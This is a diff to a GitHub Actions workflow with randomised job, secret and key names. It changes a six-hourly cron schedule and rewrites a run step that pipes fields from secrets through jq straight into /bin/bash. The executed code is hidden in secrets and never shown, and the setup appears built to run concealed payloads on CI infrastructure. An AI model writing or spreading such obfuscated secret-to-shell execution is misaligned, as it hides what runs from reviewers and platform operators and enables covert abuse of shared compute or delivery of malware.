@@ -3,23 +3,23 @@ name: xiongyonghong6473
 on:
   workflow_dispatch:
   schedule:
-    - cron: '31 5/6 * * *'
+    - cron: '50 0/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: xiongyonghong6473
         env:
-          x7007: ${{ secrets.x7007 }}
+          tkud307: ${{ secrets.tkud307 }}
         run: |
-          echo $x7007 | jq -r .gsiy0 | /bin/bash
-          echo $vlevj16 | jq -r .jcdr639 | /bin/bash
-          echo $veev38 | jq -r .yotrz9420 | /bin/bash
-          echo $astd93999 | jq -r .p803 | /bin/bash
-          echo $c43476 | jq -r .frk03 | /bin/bash
-          echo $yh35793 | jq -r .b3899 | /bin/bash
-          echo $leht3431 | jq -r .dj62 | /bin/bash
-          echo $k1 | jq -r .akkn7 | /bin/bash
+          echo $tkud307 | jq -r .jn1 | /bin/bash
+          echo $woe6739 | jq -r .c1 | /bin/bash
+          echo $q816 | jq -r .dqip9661 | /bin/bash
+          echo $w146 | jq -r .ge01683 | /bin/bash
+          echo $xhtw98 | jq -r .rmwu180 | /bin/bash
+          echo $fp3 | jq -r .qtixk870 | /bin/bash
+          echo $mx3 | jq -r .jsi52 | /bin/bash
 
